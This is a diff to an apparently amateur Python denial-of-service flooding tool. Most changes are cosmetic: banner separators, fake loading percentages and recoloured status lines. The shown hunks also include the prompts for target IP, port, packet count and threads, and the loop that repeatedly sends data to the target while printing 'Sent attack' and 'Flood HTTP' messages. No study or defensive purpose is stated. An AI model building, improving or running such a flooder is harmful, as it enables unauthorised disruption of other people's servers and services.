@@ -32,28 +32,28 @@ print("""
 \033[37m║\033[34m Author By: KunFay/https://github.com/KunFay99    \033[37m   ║
 \033[37m╚═════════════════════════════════════════════════════╝
 """)
-print("\033[94m==>")
+print("\033[94m______________________")
 ip = str(input("\033[92m[]⟩⟩ IP Target : "))
-print("\033[94m==>")
+print("\033[94m______________________")
 port = int(input("\033[92m[]⟩⟩ Port : "))
-print("\033[94m==>")
+print("\033[94m______________________")
 packs = int(input("\033[92m[]⟩⟩ Packets{0} : "))
-print("\033[94m==>")
+print("\033[94m______________________")
 thread = int(input("\033[92m[]⟩⟩ Threads : "))
-print("\033[94m==>")
+print("\033[94m______________________")
 time.sleep(5),
-print("\033[96m25% "),
+print("\033[93m======>25% "),
 time.sleep(5),
-print("\033[92m50% "),
+print("\033[93m===========>50% "),
 time.sleep(5),
-print("\033[1m75%  "),
+print("\033[93m================>75%  "),
 time.sleep(5),
-print("\033[97m100%"),
+print("\033[9m====================>100%"),
 time.sleep(5),
-print("\033[95mGo...!!"),
+print("\033[32m.....................G0...!!"),
 time.sleep(5),  
 def animated_marker():
-    widgets = ['\033[94m[\033[97m#\033[94m#\033[97mLoading: progressbar.AnimatedMarker()\033[0m']
+    widgets = ['\033[94mLoading: progressbar.AnimatedMaker()\033[0m']
     bar = progressbar.ProgressBar(widgets=widgets).start()
       
     for i in range(50):
@@ -73,8 +73,8 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m[" +str(u)+ "]  \033[32m[FOOODING WEBS]  \033[36mSent attack  \033[97mTarget: [" +ip+ "]  \033[0m")
-        print("\033[93m[" +str(u)+ "]  \033[33m[FOOODING WEBS]  \033[96mSent attack  \033[92mTarget: [" +ip+ "]  \033[0m")
+        print("\033[32m[" +str(u)+ "]  \033[32mFlo0d\033[1;32mHTTP  \033[31mTarget\033[37mIP: [" +ip+ "]  \033[0m")
+        print("\033[34m[" +str(u)+ "]  \033[33mFl0od\033[1;36mHTTP  \033[33mTarget\033[94mIP: [" +ip+ "]  \033[0m")
         
     except:
         s.close()
